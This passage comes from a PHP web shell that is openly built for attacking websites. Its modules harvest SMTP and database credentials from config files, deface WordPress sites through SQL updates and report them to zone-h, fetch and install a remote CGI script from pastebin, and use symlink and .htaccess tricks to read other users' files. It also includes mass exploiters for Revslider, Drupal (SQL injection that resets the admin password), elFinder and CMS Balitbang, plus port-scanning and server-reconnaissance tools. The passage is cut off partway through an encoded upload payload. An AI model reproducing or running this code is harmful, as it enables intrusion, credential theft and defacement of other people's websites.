} elseif($_GET['go'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=blue>$smtp_host</font><br>";
				echo "SMTP port: <font color=blue>$smtp_port</font><br>";
				echo "SMTP user: <font color=blue>$smtp_user</font><br>";
				echo "SMTP pass: <font color=blue>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=blue>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=blue>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['go'] == 'auto_wp') {
	if($_POST['launch']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, tidak bisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=blue>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='ALx was Here..!' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukkan script deface anda ( yang simple aja ), jika pilih <u>N</u> tidak perlu di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/bca42pDn' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='launch' value='LAUNCH!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['go'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=blue>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='ALxW69'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['go'] == 'cgi') {
	$cgi_dir = mkdir('alx_cgi', 0755);
	$file_cgi = "alx_cgi/cgi.izo";
$isi_htcgi = "AddHandler cgi-script .izo";		
	$htcgi = fopen(".htaccess", "w");
	fwrite($htcgi, $isi_htcgi);
	fclose($htcgi);
	$cgi_script = getsource("http://pastebin.com/raw/kZ70PK77");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fclose($cgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='alx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='yes'></iframe>";
	} elseif($_GET['go'] == 'symlink') {
 
@set_time_limit(0);
 
echo "<br><br><center><h1>Symlink</h1></center><br><br><center><div class=content>";
 
@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay  = '\.my';
$china  = '\.cn';
$japan  = '\.jp';
$austr  = '\.au';
$porn   = '\.xxx';
$as     = '\.uk';
$calfn  = '\.ca';
 
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>
 
<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>
 
<td>
'.$UID['name']."
</td>
 
<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>
 
</tr></div> ";
flush();
}
}
}
}
 
echo "</center></table>";  

} elseif($_GET['go'] == 'vhost') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Gontang'></center>";
		if (isset($_POST['Gontang'])){ system('ln -s / alxwahid.txt');
			$fvckem 

='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIY

W5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); 

$J3mbut = symlink("/","alxwahid.txt");
			$rt="<br><a href=alxwahid.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier 

New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} 

echo "</form>";

} elseif($_GET['go'] == 'balitbang') {
?>
<center>
<h1>CMS Balitbang Auto Exploiter</h1>
<form action='' method='post'>
<center>
<p>Target URL : <input style='border-color=white;' type='text' name='url' class='text' 

placeholder='http://127.0.0.1/' size="50"></p>
</p>
<p><input type='submit' name='send' class='kotak' style='border-color=white;' value='Kunci 

Target'></p></center>
</form>
<?php
if (isset($_POST['send'])) {
    $url = $_POST['url'];
    $resulturl = "Target URL : $url";
    echo "<center>
<hr color='white'><br>
$resulturl
$resultoken
</center>";
echo '<center style="border-color=white;"><form enctype="multipart/form-data" action="'.

$url.'/files/tugas/tgs-ganteng.phtml" method="post"></center>';
echo '<center style="border-color=white;"><input name="file" type="file"><input type="submit" class="kotak" 

value="Upload"><br><br>Format file: shell.phtml ato shell.php5</center>';
}
echo "</div>";

} elseif ($_GET['go'] == 'cmsvuln') {
        @set_time_limit(0);
        @error_reporting(0);
        // Script Functions , start ..!
        function ask_exploit_db($component) {
            $exploitdb = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=

$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&fi

lter_osvdb=&filter_cve=";
            $result = @file_get_contents($exploitdb);
            if (eregi("No results", $result)) {
                echo "<center><td>Tak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+

$component'>Download</a></td></tr>";
            } else {
                echo "<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";
            }
        }
        /**************************************************************/
        /* Joomla Conf */
        function get_components($site) {
            $source = @file_get_contents($site);
            preg_match_all('{option,(.*?)/}i', $source, $f);
            preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
            preg_match_all('{/components/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~] Gk ada Vroh..! Kyknya Site Error atau Option 

salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $comm) {
                echo "<tr><td>$comm</td>";
                ask_exploit_db($comm);
            }
        }
        /**************************************************************/
        /* WP Conf */
        function get_plugins($site) {
            $source = @file_get_contents($site);
            preg_match_all("#/plugins/(.*?)/#i", $source, $f);
            $plugins = array_unique($f[1]);
            if (count($plugins) == 0) {
                echo "<tr><td style='border-color:white' colspan=1>[~]  Gk ada Mblo..! Kyknya Site Error atau Option 

salah :-</td></tr>";
            }
            foreach ($plugins as $plugin) {
                echo "<tr><td>$plugin</td>";
                ask_exploit_db($plugin);
            }
        }
        /**************************************************************/
        /* Nuke's Conf */
        function get_numod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{?name=(.*?)/}i', $source, $f);
            preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i', $source, $f2);
            preg_match_all('{/modules/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gk ada Boss..! Kyknya Site Error atau Option 

salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $nmod) {
                echo "<tr><td>$nmod</td>";
                ask_exploit_db($nmod);
            }
        }
        /*****************************************************/
        /* Xoops Conf */
        function get_xoomod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{/modules/(.*?)/}i', $source, $f);
            $arz = array_merge($f[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gk ada Capt..! Kyknya Site Error atau Option 

salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $xmod) {
                echo "<tr><td>$xmod</td>";
                ask_exploit_db($xmod);
            }
        }
        /**************************************************************/
        /* Header */
        function t_header($site) {
            echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-

align:left;" width="50%" cellspacing="1" cellpadding="5">';
            echo '
<tr>
<td style="border-color=white">Site : <a href="' . $site . '">' . $site . '</a></td>
<td style="border-color=white">Exploit-db</b></td>
<td style="border-color=white">Exploit it !</td>
</tr>
';
        }
        echo '<style="text-align:left">
<h1>CMS Vulnerability Scanner</h1><hr color="white">
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" 

name="site" value="http://127.0.0.1/" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="submit" style="width: 50px; height: 30px; 

border-color=white;margin:10px 2px 0 2px;" value="Hajar" class="kotak"></p>
</form>';
        // Start Scan :P :P ...
        if ($_POST) {
            $site = strip_tags(trim($_POST['site']));
            t_header($site);
            echo $x01 = ($_POST['pilihan'] == "Wordpress") ? get_plugins($site) : "";
            echo $x02 = ($_POST['pilihan'] == "Joomla") ? get_components($site) : "";
            echo $x03 = ($_POST['pilihan'] == "Nuke's") ? get_numod($site) : "";
            echo $x04 = ($_POST['pilihan'] == "Xoops") ? get_xoomod($site) : "";
        }

} elseif ($_GET['go'] == 'revslider') {
        echo "
<center>
<h1>Revslider Mass Exploiter</h1>
<form method='post'>
<textarea color='white' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='kotak' type='submit' style='width: 50px; height: 30px; border-color:white;margin:10px 2px 0 2px;' 

name='hajar' value='HAJAR'>
</form></center>
";
        function findit($mytext, $starttag, $endtag) {
            $posLeft = stripos($mytext, $starttag) + strlen($starttag);
            $posRight = stripos($mytext, $endtag, $posLeft + 1);
            return substr($mytext, $posLeft, $posRight - $posLeft);
        }
        error_reporting(0);
        set_time_limit(0);
        $ya = $_POST['hajar'];
        $co = $_POST['site'];
        if ($ya) {
            $e = explode("
", $co);
            foreach ($e as $bda) {
                //echo '<br>'.$bda;
                $linkof = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
                $dn = ($bda) . ($linkof);
                $file = @file_get_contents($dn);
                if (eregi('DB_HOST', $file) and !eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white 

>----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=lime >DB name : </font>" . findit($file, "DB_NAME', '", 

"');") . "<br>";
                    echo "<font face='courier' color=lime >DB user : </font>" . findit($file, "DB_USER', '", 

"');") . "<br>";
                    echo "<font face='courier' color=lime >DB pass : </font>" . findit($file, "DB_PASSWORD', 

'", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB host : </font>" . findit($file, "DB_HOST', '", 

"');") . "<br>";
                } elseif (eregi('DB_HOST', $file) and eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white 

>----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=lime >FTP user : </font>" . findit($file, "FTP_USER','", 

"');") . "<br>";
                    echo "<font face='courier' color=lime >FTP pass : </font>" . findit($file, "FTP_PASS','", 

"');") . "<br>";
                    echo "<font face='courier' color=lime >FTP host : </font>" . findit($file, "FTP_HOST','", 

"');") . "<br>";
                } else {
                    echo "<center><font face='courier' color='red' >" . $bda . " ----> not infected 

</font></center>";
                }
                echo '<center><font face="courier" color=white >----------------------------------------------

</font></center>';
            }
        }

} elseif ($_GET['go'] == 'drupal') {
        echo "<center>
<h1>Drupal Mass Exploiter</h1><br>
<form method='post' action=''>
<textarea rows='10' cols='10' name='url'>
http://www.site.com
http://www.site2.com</textarea><br><br>
<input type='submit' class='kotak' style='border-color:white' name='submit' value='HAJAR MBLO!'>
</form>
</div>
";
        $drupal = ($_GET["drupal"]);
        if ($drupal == 'drupal') {
            $filename = $_FILES['file']['name'];
            $filetmp = $_FILES['file']['tmp_name'];
            echo "<form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";
            move_uploaded_file($filetmp, $filename);
        }
        error_reporting(0);
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'alxwahid' , pass %3D '" . urlencode('$S

$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]

=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
                $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-

www-form-urlencoded
", 'content' => $post_data));
                $ctx = stream_context_create($params);
                $data = file_get_contents($url . '/user/login/', null, $ctx);
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr

($data, 'FcUk Crap') && $data)) {
                    $fp = fopen("exploited.txt", 'a+');
                    fwrite($fp, "Exploited  User: alxwahid Pass: alxwahid  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, 

"--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<font color='lime'><b>Success:<font color='white'>alxwahid</font> Pass:<font 

color='white'>alxwahid</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> 

{$url}/user/login </font></a></font></b><br>";
                } else {
                    echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
                }
            }
            $urls = explode("
", $_POST['url']);
            foreach ($urls as $url) {
                $url = @trim($url);
                echo exploit($url);
            }
        }

} elseif ($_GET['go'] == 'zip') {
        echo "<center>";
        echo "<h1>Zip Menu</h1>";
        function rmdir_recursive($dir) {
            foreach (scandir($dir) as $file) {
                if ('.' === $file || '..' === $file) continue;
                if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
                else unlink("$dir/$file");
            }
            rmdir($dir);
        }
        if ($_FILES["zip_file"]["name"]) {
            $filename = $_FILES["zip_file"]["name"];
            $source = $_FILES["zip_file"]["tmp_name"];
            $type = $_FILES["zip_file"]["type"];
            $name = explode(".", $filename);
            $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 

'application/x-compressed');
            foreach ($accepted_types as $mime_type) {
                if ($mime_type == $type) {
                    $okay = true;
                    break;
                }
            }
            $continue = strtolower($name[1]) == 'zip' ? true : false;
            if (!$continue) {
                $message = "Itu Bukan Zip  , , TOLO...";
            }
            $path = dirname(__FILE__) . '/';
            $filenoext = basename($filename, '.zip');
            $filenoext = basename($filenoext, '.ZIP');
            $targetdir = $path . $filenoext;
            $targetzip = $path . $filename;
            if (is_dir($targetdir)) rmdir_recursive($targetdir);
            mkdir($targetdir, 0777);
            if (move_uploaded_file($source, $targetzip)) {
                $zip = new ZipArchive();
                $x = $zip->open($targetzip);
                if ($x === true) {
                    $zip->extractTo($targetdir);
                    $zip->close();
                    unlink($targetzip);
                }
                $message = "<b>Sukses Mblo :)</b>";
            } else {
                $message = "<b>Error Tailaso :(</b>";
            }
        }
        echo '<table style="width:100%" border="1">
<h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" class="kotak" name="submit" value="Upload And Unzip" />
</form><br><br></div>';
        if ($message) echo "<p>$message</p>";
        echo "<h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input type='text' name='save' value='$dir/alxwahid_backup.zip' style='width: 450px;' height='10'><br><br>
<input type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br></div>";
        if ($_POST['backup']) {
            $save = $_POST['save'];
            function Zip($source, $destination) {
                if (extension_loaded('zip') === true) {
                    if (file_exists($source) === true) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
                            $source = realpath($source);
                            if (is_dir($source) === true) {
                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), 

RecursiveIteratorIterator::SELF_FIRST);
                                foreach ($files as $file) {
                                    $file = realpath($file);
                                    if (is_dir($file) === true) {
                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                    } else if (is_file($file) === true) {
                                        $zip->addFromString(str_replace($source . '/', '', $file), 

file_get_contents($file));
                                    }
                                }
                            } else if (is_file($source) === true) {
                                $zip->addFromString(basename($source), file_get_contents($source));
                            }
                        }
                        return $zip->close();
                    }
                }
                return false;
            }
            Zip($_POST['dir'], $save);
            echo "Selesai , Save To <b>$save</b>";
        }
        echo "
    <h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input type='text' name='save' value='$dir/alxwahid_unzip' style='width: 450px;' height='10'><br><br>
    <input type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    </div>";
        if ($_POST['extrak']) {
            $save = $_POST['save'];
            $zip = new ZipArchive;
            $res = $zip->open($_POST['dir']);
            if ($res === TRUE) {
                $zip->extractTo($save);
                $zip->close();
                echo 'Success , Location : <b>' . $save . '</b>';
            } else {
                echo 'Gagal mblo :( Pusing !';
            }
        }
        echo '</table>';
        echo "</div>";;
        
} elseif($_GET['go'] == 'contact') {
	echo "<center><br><font size='6'><=[ Contact Me ]=></font><br><br>
	<table><td style='background-color: transparent;text-align:center;border: 2px red 

dotted;width:300px;height:250px;'>
	<font color='gold'>Email : alx.wahid@gmail.com | <a href='https://www.facebook.com/405.phtml' 

target='_blank'>Facebook</font><br></tr></td></table></center>";        

} elseif ($_GET['go'] == 'port') {
        echo '<center><div style="text-align:left"><table><tr><h1>Port Scanner</h1><td>';
        echo '<div class="content">';
        echo '<form action="" method="post">';
        if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
            $start = strip_tags($_POST['start']);
            $end = strip_tags($_POST['end']);
            $host = strip_tags($_POST['host']);
            for ($i = $start;$i <= $end;$i++) {
                $fp = @fsockopen($host, $i, $errno, $errstr, 3);
                if ($fp) {
                    echo 'Port ' . $i . ' is <font color=green>open</font><br>';
                }
                flush();
            }
        } else {
            echo '<input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input 

type="hidden" name="p2">
              <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
              <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : 

'') . '">
              Host: &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px 

solid #292929; width:500px;" name="host" value="localhost"/><br /><br />
              Port Start: &nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; 

width:500px;" name="start" value="0"/><br /><br />
              Port End:&nbsp&nbsp&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; 

width:500px;" name="end" value="5000"/><br /><br />
              <input type="submit" style="width: 100px; height: 30px; border-color=white;margin:10px 2px 0 

2px;" value="Scan Ports !" />
              </form>';
            echo '</div></table></td></div>';
        }

} elseif($_GET['go'] == 'infosec') {
echo '<center><table><h1>Server security information</h1><td><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>'.$n.': </span>';
            if(strpos($v, "\n") === false)
                echo $v.'<br>';
            else
                echo '<pre class=ml1>'.$v.'</pre>';
        }
    }
    
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS

['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    echo '<br>';
    
    if( $GLOBALS['os'] == 'nix' ) {
        $userful = array

('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl'

);
        $danger = array

('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','

shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sa

wmill','wormscan','ninja');
        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
        showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g

(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
        showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g

(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
        showSecParam('OS version', @file_get_contents('/proc/version'));
        showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
        if(!$GLOBALS['safe_mode']) {
            echo '<br>';
            $temp=array();
            foreach ($userful as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Userful', implode(', ',$temp));
            $temp=array();
            foreach ($danger as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Danger', implode(', ',$temp));
            $temp=array();
            foreach ($downloaders as $item) 
                if(which($item)){$temp[]=$item;}
            showSecParam('Downloaders', implode(', ',$temp));
            echo '<br/>';
            showSecParam('Hosts', @file_get_contents('/etc/hosts'));
            showSecParam('HDD space', ex('df -h'));
            showSecParam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        showSecParam('OS Version',ex('ver')); 
        showSecParam('Account Settings',ex('net accounts')); 
        showSecParam('User Accounts',ex('net user'));
    }
    echo '</div></th></table>';
    echo '</div></th></table>';
    echo "</div>";

} elseif ($_GET['go'] == 'elfinder') {
        echo "<center>";
        echo '<h1>elFinder Mass Exploiter</h1>';
        echo '<form method="post">
Target: <br>
<textarea name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; 

height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input type="submit" name="x" style="width: 150px; height: 25px; margin: 5px;" value="HAJAR!">
</form>';
        echo "</div>";
        function ngirim($url, $isi) {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 

Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
            curl_setopt($ch, CURLOPT_COOKIEJAR, 'coker_log');
            curl_setopt($ch, CURLOPT_COOKIEFILE, 'coker_log');
            $data3 = curl_exec($ch);
            return $data3;
        }
        $target = explode("
", $_POST['target']);
        if ($_POST['x']) {
            foreach ($target as $korban) {
                $nama_doang = "alxwahid.php";
                $isi_nama_doang = 

"PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIj

xiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
